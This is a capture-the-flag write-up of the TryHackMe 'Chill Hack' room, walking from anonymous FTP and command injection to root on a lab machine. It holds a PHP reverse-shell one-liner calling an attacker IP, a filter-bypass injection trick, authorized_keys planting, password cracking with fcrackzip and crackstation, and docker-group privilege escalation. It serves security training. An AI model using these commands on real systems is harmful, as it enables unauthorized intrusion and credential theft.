---
layout: post
title: Tryhackme - Chill Hack
date: 2020-12-13 19:00:00 +0000
category: [Tryhackme, Easy]
tags: [thm,linux,easy,ftp]
---

---
<p>Chill Hack is a beginner level Tryhackme room. It was fun doing this room since there are multiple ways to get to the credentials. The final objective is to get the user and root flag. In this post I'll be explaining how I cleared this room.</p>
<br>
![cover_image](/assets/img/tryhackme/chillhack/1.png)

**Author** | Anurodh
**Description** | This room provides the real world pentesting challenges.

Deploy the VM and let's go.

## <ins>Enumeration</ins>
---
Let's start with a nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/chillhack/nmap_scan.png)
<br>
From the nmap scan we can see the ports ```21/ftp```, ```22/ssh```, ```80/http``` are open. ```Anonymous``` login is allowed in ```ftp``` service.

I logged into the ftp server and found a text file. I downloaded it using the ```get file-name``` command. 
<br>
![ftp_server](/assets/img/tryhackme/chillhack/2.png)
<br>
I read the file and just noted it as a hint and switched to enumerate the http service.
<br>
![home_page](/assets/img/tryhackme/chillhack/3.png)
<br>
Use gobuster to bruteforce the hidden directories.
<br>
![gobster_1](/assets/img/tryhackme/chillhack/4.png)
<br>
I visited the most interesting directory ```/secret``` and I found only a input box with the placeholder ```Command```. So, I gave ```ls``` to check if it really executes the command and the site changes to this background image.
<br>
![alert_page](/assets/img/tryhackme/chillhack/5.png)
<br>
Then I tried ```whoami``` and the page successfully returned the output.
<br>
![whoami_command](/assets/img/tryhackme/chillhack/6.png)
<br>
So, I used this to bypass without trigerring the alert.
<br>
<pre>whoami;ls -la</pre>
<br>
![long_listing](/assets/img/tryhackme/chillhack/7.png)
<br>
Note that ```; (semicolon)``` in linux is used to split one command from another. 


## <ins>Reverse Shell</ins>
---
Since that worked, I grabbed the php reverse shell payload and used it with ```whoami``` to bypass the alert. Remember to open a netcat listener in your local machine before executing the payload.
<br>
<pre>whoami;php -r '$sock=fsockopen("your-vpn-ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
<br>
![reverse_shell1](/assets/img/tryhackme/chillhack/8.png)
<br>

## <ins>User flag</ins>
---
I used ```sudo -l``` to list the files that can be run as other users.
<br>
![sudo_list](/assets/img/tryhackme/chillhack/9.png)
<br>
I read the file and found a way to gain shell access for the user ```apaar```.
<br>
![helpline_cat](/assets/img/tryhackme/chillhack/11.png)
<br>
Take a look at the second input ```$msg```. The code says that anything we put in the variable ```msg``` will be dumped into ```/dev/null``` which is like a blackhole...that is we cannot retrieve anything that is put into it. So, we can spawn a shell before it dumps into the ```/dev/null```.  
<br>
First run the file as the user ```apaar```.
<br>
<pre>sudo -u apaar ./.helpline.sh</pre>
<br>
Then, give a arbitary input for the first variable. Give ```/bin/bash``` as second input. And finally use ```python pty``` to get a stable shell.
<br>
![shell_apaar](/assets/img/tryhackme/chillhack/12.png)
<br>
The ```user flag``` is in the ```home``` directory of the user ```apaar``` in file named ```local.txt```.


## <ins>Getting user anurodh</ins>
---
I found more than one way to get to the credentials of the user ```anurodh```. 

### <ins>Method 1</ins>
---
After running ```linpeas.sh``` I found some ports running which are accessible only by the ```localhost```.
<br>
![linpeas_port](/assets/img/tryhackme/chillhack/15.png)
<br>
I generated a ```ssh key pair``` in my local machine.
<br>
<pre>ssh-keygen</pre>
<br>
Enter the path for it to generate new ```ssh key pair``` in the local machine. Copy the contents of the ```public key (id_rsa.pub)``` and in the remote machine append it to the ```/home/apaar/.ssh/authorized_keys``` file.
<br>
<pre>echo "your-ssh-public-key-contents" >> /home/apaar/.ssh/authorized_keys</pre>
<br>
Now we can ssh into the machine using the private key ```id_rsa```.
<br>
<pre>ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa</pre>
<br>
Here, we are basically tunnelling the port ```9001``` from the remote machine into our local machine ```127.0.0.1:9001```.
<br>
![ssh_tunnel](/assets/img/tryhackme/chillhack/17.png)
<br>
Now we can access that service through our browser using ```127.0.0.1:9001```.
<br>
![login_page](/assets/img/tryhackme/chillhack/18.png)
<br>


#### <ins>Sub-Method 1</ins>
---
I tried some common credentials but had no luck with it. After searching through the files for a bit I found the credentials for ```mysql``` in the file ```/var/www/files/index.php```.
<br>
![mysql_creds](/assets/img/tryhackme/chillhack/19.png)
<br>
I connected to the ```mysql service``` from the remote machine.
<br>
<pre>mysql -u root -p</pre>
<br>
Use the ```mysql password``` that we just found. Then I used some commands to finally arrive at the credentials.
<br>
<pre>
SHOW DATABASES;
USE webportal
SHOW TABLES;
SELECT * FROM users;
</pre>
<br>
![webportal_credentials](/assets/img/tryhackme/chillhack/22.png)
<br>
I used [crackstation](crackstation.net) to crack the MD5 passwords. Then, I logged into the webportal with the credentials.
<br>
![portal_login](/assets/img/tryhackme/chillhack/24.png)
<br>
Download the image in the page ```/hacker.php```.


#### <ins>Sub-Method 2</ins>
---
Without getting the credentials to the webportal and mysql we can still get to the page ```/hacker.php```. Use ```gobuster``` with the common wordlist.
<br>
<pre>gobuster dir -u http://127.0.0.1:9001/ -w /usr/share/dirb/wordlists/common.txt -x php </pre>
<br>
![gobuster_webportal](/assets/img/tryhackme/chillhack/23.png)
<br>
Download the image in the page ```/hacker.php```.

---
**Before getting the password for the user ```anurodh``` I'll also explain the second method which is wayyy easier than the first one.**


### <ins>Method 2</ins>
---
This is the method that I actually used to clear the room. It was just a coincidence that I saw the ```/files``` directory in the parent directory after I got the reverse shell. I tried using ```python -m SimpleHTTPServer 8080``` to transfer the files but it throwed an error stating that ```python2``` was not installed. Then, I used the ```python3 http server```.
<br>
<pre>python3 -m http.server 8080</pre>
<br>
And I downloaded the contents using browser from my local machine.

After I transferred everything in the ```/files``` directory to my local machine, I analysed it. And finally I got the password for the user ```anurodh```.

---
**Now let's continue from the part where we got the ```.jpg``` file from the ```/files``` directory.**

Use ```steghide``` to extract the contents of the image.
<br>
<pre>steghide --extract -sf hacker.jpg</pre>
<br>

The ```zip file``` is password protected. Use ```fcrackzip``` to bruteforce the password.
<br>
<pre>fcrackzip -u -v -D -p ~/Wordlists/rockyou.txt backup.zip</pre>
<br>
![zip_password](/assets/img/tryhackme/chillhack/26.png)
<br>

The password for the user ```anurodh``` can be found as a base64 encoded string in the inflated ```php``` file. Decode it.
<br>
![pass_base64](/assets/img/tryhackme/chillhack/27.png)
<br>

Change the user to ```anurodh``` using ```su anurodh``` and use the password that we just found.


## <ins>Root flag</ins>
---
After using ```id```, it seems that the user is in the ```docker``` group.
<br>
![id_docker](/assets/img/tryhackme/chillhack/28.png)
<br>
I grabbed the payload to get the shell access to root from ```gtfobins```.
<br>
![gtfo_bins](/assets/img/tryhackme/chillhack/29.png)
<br>
The root flag is in the file named ```proof.txt```.
<br>
![root_flag](/assets/img/tryhackme/chillhack/30.png)
<br>

I had fun doing this room. Hope you had too!!!

That's it folks. Happy hacking!!!
